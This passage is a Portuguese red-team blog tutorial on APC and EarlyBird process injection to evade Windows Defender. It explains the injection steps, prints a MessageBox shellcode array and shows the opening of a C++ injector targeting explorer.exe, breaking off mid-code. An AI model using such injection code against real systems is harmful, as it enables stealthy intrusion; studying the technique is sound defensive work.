<!DOCTYPE html>
<html lang="br">
<head>
  
    <title>Malware-Dev 0x00 - APC Injection &amp; EarlyBird, ou: Bypassando Windows Defender por divers√£o e lucro :: Midnight Hackings</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content=" Escrito por: Mateus Gualberto (Midnight Reverser) - orgulho de escrever sem IA envolvida no processo!
Licen√ßa: livre, como todo conhecimento deve ser.
Introdu√ß√£o Nesse artigo, iremos discutir o funcionamento de APCs em sistemas Windows e como podemos utiliz√°-las ao nosso favor em cen√°rios de evas√£o de defesas e red teaming.
Durante o artigo iremos construir alguns artefatos na linguagem C&#43;&#43;, sendo dois deles diretamente relacionados √† inje√ß√£o maliciosa de APCs. Na √∫ltima se√ß√£o, ap√≥s todo o arcabou√ßo te√≥rico e pr√°tico adquirido, iremos testar um caso de uso real para evas√£o do Windows Defender.
" />
<meta name="keywords" content="midnight,blog,reverse-engineer,reversing" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="https://blog.midnighthackings.com/posts/maldev-0x00/" />





  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">


<link rel="stylesheet" href="https://blog.midnighthackings.com/terminal.css">




<link rel="shortcut icon" href="https://blog.midnighthackings.com/favicon.png">
<link rel="apple-touch-icon" href="https://blog.midnighthackings.com/apple-touch-icon.png">


<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="" />
  
    <meta name="twitter:creator" content="" />



<meta property="og:locale" content="br" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Malware-Dev 0x00 - APC Injection &amp; EarlyBird, ou: Bypassando Windows Defender por divers√£o e lucro">
<meta property="og:description" content=" Escrito por: Mateus Gualberto (Midnight Reverser) - orgulho de escrever sem IA envolvida no processo!
Licen√ßa: livre, como todo conhecimento deve ser.
Introdu√ß√£o Nesse artigo, iremos discutir o funcionamento de APCs em sistemas Windows e como podemos utiliz√°-las ao nosso favor em cen√°rios de evas√£o de defesas e red teaming.
Durante o artigo iremos construir alguns artefatos na linguagem C&#43;&#43;, sendo dois deles diretamente relacionados √† inje√ß√£o maliciosa de APCs. Na √∫ltima se√ß√£o, ap√≥s todo o arcabou√ßo te√≥rico e pr√°tico adquirido, iremos testar um caso de uso real para evas√£o do Windows Defender.
" />
<meta property="og:url" content="https://blog.midnighthackings.com/posts/maldev-0x00/" />
<meta property="og:site_name" content="Midnight Hackings" />

  <meta property="og:image" content="https://blog.midnighthackings.com/og-image.png">

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2022-08-01 19:15:14 -0300 -03" />












</head>
<body>


<div class="container center">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    Midnight Hackings
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;‚ñæ</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/posts">Postagens</a></li>
        
      
        
          <li><a href="/tags">Tags</a></li>
        
      
        
          <li><a href="https://github.com/midnight-rev">Github</a></li>
        
      
        
          <li><a href="/index.xml">RSS</a></li>
        
      
      
        <hr />
        
          <li>
            <a href="https://blog.midnighthackings.com/">üáßüá∑ Brasileiro</a>
          </li>
        
      
    </ul>
  </li>
</ul>

    
    
      <ul class="menu menu--desktop menu--language-selector">
  <li class="menu__trigger">üáßüá∑ Brasileiro&nbsp;‚ñæ</li>
  <li>
    <ul class="menu__dropdown">
      
        <li><a href="https://blog.midnighthackings.com/">üáßüá∑ Brasileiro</a></li>
      
    </ul>
  </li>
</ul>

    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/posts" >Postagens</a></li>
        
      
        
          <li><a href="/tags" >Tags</a></li>
        
      
        
          <li><a href="https://github.com/midnight-rev" >Github</a></li>
        
      
        
          <li><a href="/index.xml" >RSS</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="https://blog.midnighthackings.com/posts/maldev-0x00/">Malware-Dev 0x00 - APC Injection &amp; EarlyBird, ou: Bypassando Windows Defender por divers√£o e lucro</a>
  </h1>
  <div class="post-meta"><time class="post-date">01/08/2022&nbsp;[Atualizado em 01/08/2022]</time><span class="post-reading-time">17 minuto(s) de leitura (3566 palavras)</span></div>

  
    <span class="post-tags">
      
      #<a href="https://blog.midnighthackings.com/tags/malware-dev/">malware-dev</a>&nbsp;
      
      #<a href="https://blog.midnighthackings.com/tags/injection/">injection</a>&nbsp;
      
    </span>
  
  


  
    <div class="table-of-contents">
      <h2>
        Sum√°rio
      </h2>
      <nav id="TableOfContents">
  <ul>
    <li><a href="#teoria">Teoria</a></li>
    <li><a href="#pr√°tica">Pr√°tica</a>
      <ul>
        <li><a href="#apc-injection-cl√°ssico">APC Injection cl√°ssico</a></li>
        <li><a href="#earlybird-injection">EarlyBird Injection</a></li>
      </ul>
    </li>
    <li><a href="#evadindo-windows-defender-com-inje√ß√µes-apc">Evadindo Windows Defender com inje√ß√µes APC</a>
      <ul>
        <li><a href="#resultados-shellcode-runner">Resultados Shellcode Runner</a></li>
        <li><a href="#resultados-apc-injector">Resultados APC Injector</a></li>
        <li><a href="#resultados-earlybird">Resultados EarlyBird</a></li>
      </ul>
    </li>
    <li><a href="#conclus√£o">Conclus√£o</a></li>
  </ul>
</nav>
    </div>
  

  <div class="post-content"><div>
        <blockquote>
<p>Escrito por: Mateus Gualberto (Midnight Reverser) - <strong>orgulho de escrever sem IA envolvida no processo!</strong><br>
Licen√ßa: livre, como todo conhecimento deve ser.</p>
</blockquote>
<h1 id="introdu√ß√£o">Introdu√ß√£o<a href="#introdu√ß√£o" class="hanchor" ariaLabel="Anchor">#</a> </h1>
<p>Nesse artigo, iremos discutir o funcionamento de APCs em sistemas Windows e como podemos utiliz√°-las ao nosso favor em cen√°rios de evas√£o de defesas e red teaming.</p>
<p>Durante o artigo iremos construir alguns artefatos na linguagem C++, sendo dois deles diretamente relacionados √† inje√ß√£o maliciosa de APCs. Na √∫ltima se√ß√£o, ap√≥s todo o arcabou√ßo te√≥rico e pr√°tico adquirido, iremos testar um caso de uso real para evas√£o do Windows Defender.</p>
<p>Caso o leitor queira seguir o passo-a-passo de cria√ß√£o, recomendo configurar a vers√£o mais atual do Visual Studio Community em uma m√°quina virtual Windows 10, al√©m de marcar a instala√ß√£o das bibliotecas e ferramentas de compila√ß√£o C/C++. Todos os c√≥digos dever√£o ser compilados com a op√ß√£o &ldquo;Release&rdquo; e arquitetura x64, a n√£o ser que outra configura√ß√£o seja especificada.</p>
<p>Al√©m disso, uma m√°quina Kali e conhecimentos de redes b√°sico e metasploit/msfvenom s√£o necess√°rios para simular um advers√°rio externo.</p>
<p>Como parte das t√©cnicas e modos de evas√£o de defesa, √© prov√°vel que os m√©todos descritos ou o shellcode sejam detectados e bloqueados com o passar do tempo, devido a melhorias na solu√ß√£o de antiv√≠rus.</p>
<p>Abaixo est√£o links para o instalador do Visual Studio Community e m√°quina virtual Windows 10 gratuita:</p>
<ul>
<li><a href="https://visualstudio.microsoft.com/pt-br/vs/community/">Visual Studio Community</a></li>
<li><a href="https://bit.ly/windowsvm">M√°quina virtual Windows 10 Evaluation</a></li>
</ul>
<h2 id="teoria">Teoria<a href="#teoria" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>APCs, ou <em>Asynchronous Procedure Calls</em>, s√£o uma forma de sinalizar e executar instru√ß√µes ou fun√ß√µes de forma ass√≠ncrona no contexto de uma thread em um determinado processo.
Podem ser utilizadas como m√©todo de callback, e um exemplo desse uso √© a fun√ß√£o <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfileex">ReadFileEx</a>, que ir√° informar de forma ass√≠ncrona o status de completude ou cancelamento da leitura de um arquivo.</p>
<p>Existem APCs em kernelmode, que podem ser gerenciadas por certos tipos de drivers, e em usermode, que ser√° o foco desse artigo.</p>
<p>A API necess√°ria para se realizar uma APC em usermode √© a <code>kernel32!QueueUserAPC</code>, que necessitar√° de 3 argumentos: um ponteiro para uma fun√ß√£o APC (<em>pfnAPC</em>), um handle para a thread para onde a APC dever√° ser enfileirada (<em>hThread</em>) e um ponteiro para argumentos extra a serem repassados para a fun√ß√£o (<em>dwData</em>).</p>
<p>A documenta√ß√£o da <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc#remarks">MSDN sobre as APCs</a> informa que n√£o √© recomendado o enfileiramento de APCs em threads que n√£o s√£o pertencentes ao processo que chamou <code>QueueUserAPC</code>, devido a problemas de <em>rebasing</em> e de arquitetura. Por√©m, n√£o h√° impedimento a n√≠vel de implementa√ß√£o que evite o uso de handles para threads em outros processos.</p>
<p>N√≥s, como atacantes, vamos ignorar o alerta de problemas relacionados a <em>rebasing</em>, visto que nosso shellcode n√£o dever√° sofrer altera√ß√µes de funcionamento por esse motivo, e construiremos um injetor de APCs para threads em processos remotos.</p>
<h2 id="pr√°tica">Pr√°tica<a href="#pr√°tica" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<h3 id="apc-injection-cl√°ssico">APC Injection cl√°ssico<a href="#apc-injection-cl√°ssico" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>Um atacante poder√° utilizar o funcionamento das APCs ao seu favor seguindo os passos descritos abaixo.</p>
<ol>
<li>O processo injetor ir√° obter um handle para um processo-v√≠tima existente, com permiss√µes de leitura, escrita e execu√ß√£o;</li>
<li>O injetor ir√°, ent√£o, alocar uma mem√≥ria RWX no processo remoto e escrever√° um shellcode malicioso - essa ser√° nossa fun√ß√£o APC;</li>
<li>A APC injetada dever√° ser enfileirada para uma ou mais threads no processo-v√≠tima;</li>
<li>O atacante dever√° aguardar at√© que uma das threads entre em modo &ldquo;alertable&rdquo;. Entrando nesse modo, a thread ir√° executar as APCs enfileiradas e, consequentemente, o nosso shellcode.</li>
</ol>
<p>Note como o processo √© bem semelhante a um <em>Process Injection</em> comum, onde a cria√ß√£o de uma thread remota √© subsitu√≠da pela chamada ass√≠ncrona. Entretanto, o passo 4 √© um dos principais pontos negativos dessa inje√ß√£o, visto que n√£o conseguiremos obter sucesso na execu√ß√£o em qualquer processo que esteja rodando no alvo.</p>
<p>No Windows, apenas alguns processos nativos t√™m threads que ficam no estado alertable. O mais famoso caso √© o <em>explorer.exe</em>, que sempre est√° em execu√ß√£o em sistemas Windows e sempre ter√° pelo menos uma thread que ficar√° em estado alertable em algum momento. Por esses dois motivos, ele se torna uma pe√ßa central para atacantes que desejam utilizar tal t√©cnica.</p>
<blockquote>
<p>Segundo a <a href="https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls">MSDN</a>, uma thread ficar√° em modo <em>alertable</em> quando h√° a chamada de alguma das fun√ß√µes abaixo:</p>
<ul>
<li><code>SleepEx</code></li>
<li><code>SignalObjectAndWait</code></li>
<li><code>MsgWaitForMultipleObjectsEx</code></li>
<li><code>WaitForMultipleObjectsEx</code></li>
<li><code>WaitForSingleObjectEx</code></li>
</ul>
</blockquote>
<p>Um problema relacionado ao uso dessa t√©cnica √© que seu uso pode resultar em um crash da aplica√ß√£o injetada. Podemos tentar diminuir a probabilidade de crashes ao limitar a quantidade de threads para as quais o shellcode dever√° ser enfileirado.</p>
<p>Para testarmos na pr√°tica a efic√°cia da t√©cnica APC Injection, utilizaremos a solu√ß√£o do Visual Studio dispon√≠vel no meu <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/maldev/0x00/Examples/APC%20Injector">Github</a> e utilizaremos o <em>explorer.exe</em> como alvo da nossa t√©cnica.</p>
<p>Vamos, primeiramente, fazer um <em>walthrough</em> pelo c√≥digo do injetor.</p>
<h4 id="apc-injector">APC Injector<a href="#apc-injector" class="hanchor" ariaLabel="Anchor">#</a> </h4>
<p>Nosso injetor ser√° executado repassando o nome de um processo presente na m√°quina.</p>
<p>No nosso c√≥digo, utilizaremos principalmente fun√ß√µes da <code>windows.h</code> para alocar mem√≥ria e injetar o shellcode e a <code>tlhelp32.h</code> para realizarmos um &ldquo;snapshot&rdquo; do estado atual do sistema, a√ß√£o que permite a navega√ß√£o por processos e threads. As fun√ß√µes importadas da <code>iostream</code> s√£o opcionais e servir√£o para debugging, e utilizaremos sempre que poss√≠vel as vers√µes de fun√ß√µes que tratam dados UTF-16 devido a uma melhor compatibilidade com certas estruturas que usaremos no c√≥digo.</p>
<p>Utilizaremos uma diretiva de pr√©-processamento para definirmos uma macro (<code>THREAD_INJECTION_LIMIT</code>) que limitar√° a quantidade de threads que devem sofrer inje√ß√£o. Isso √© importante para termos mais controle sobre como a inje√ß√£o √© realizada, buscando evitar crashes. Por√©m, ao definirmos um limite, √© poss√≠vel que uma thread alertable n√£o tenha o shellcode inclu√≠do nas sua fila de APCs. Aumente o valor caso a inje√ß√£o n√£o funcione.</p>
<p>Definiremos uma vari√°vel global para guardar nosso shellcode x64, que, nesse caso, tem apenas a fun√ß√£o de executar uma MessageBox. <a href="https://gist.github.com/kkent030315/b508e56a5cb0e3577908484fa4978f12">Link</a> para o gist original do shellcode.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define THREAD_INJECTION_LIMIT 2
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// Spawns a MessageBox
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> \
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3</span><span class="s">&#34;</span><span class="p">;</span>
</span></span></code></pre></div><p>As primeiras linhas de c√≥digo da main ir√£o garantir que o usu√°rio dever√° repassar um nome de um processo para prosseguir com a t√©cnica.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">wmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">wchar_t</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;USAGE: &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="s">&#34; &lt;proc_name&gt;&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p>Prosseguindo, iremos chamar a fun√ß√£o <a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot">CreateToolhelp32Snapshot</a>, passando a constante <code>TH32CS_SNAPPROCESS</code> e o valor <code>0</code> como segundo argumento para enumerarmos todos os processos no sistema.</p>
<p>Ap√≥s isso, iremos definir a vari√°vel <code>procEntry</code> do tipo <code>PROCESSENTRY32</code>, que ser√° utilizada para iterar sobre a lista de processos em um la√ßo for (como expl√≠cito no c√≥digo pelo uso das fun√ß√µes <code>Process32First</code> e <code>Process32Next</code>).</p>
<p>Quando encontrarmos um processo que tenha o nome igual ao repassado por <code>argv[1]</code>, o la√ßo se quebrar√° e iremos imprimir o valor do seu PID. Caso contr√°rio, o la√ßo ir√° esgotar e o injetor informar√° que n√£o h√° processo com tal nome.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] Getting list of active processes...&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Creating ToolHelp32 to search through all the processes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">HANDLE</span> <span class="n">hSnapshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">hSnapshot</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[-] Error in getting list of active processes&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">PROCESSENTRY32</span> <span class="n">procEntry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">procEntry</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Searching for the process whose name is pointed by argv[1]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// By default, if it doesn&#39;t find it, the process chosen will be the injector itself
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] Trying to find &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="s">&#34; in the list...&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="k">auto</span> <span class="n">proc</span> <span class="o">=</span> <span class="n">Process32First</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">procEntry</span><span class="p">);</span> <span class="n">proc</span><span class="p">;</span> <span class="n">proc</span> <span class="o">=</span> <span class="n">Process32Next</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">procEntry</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">lstrcmpW</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">procEntry</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">lstrcmpW</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">procEntry</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] Found process &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">procEntry</span><span class="p">.</span><span class="n">szExeFile</span> <span class="o">&lt;&lt;</span> <span class="s">&#34; with PID &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">procEntry</span><span class="p">.</span><span class="n">th32ProcessID</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[~] No process &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="s">&#34; found. Why not try explorer.exe?&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
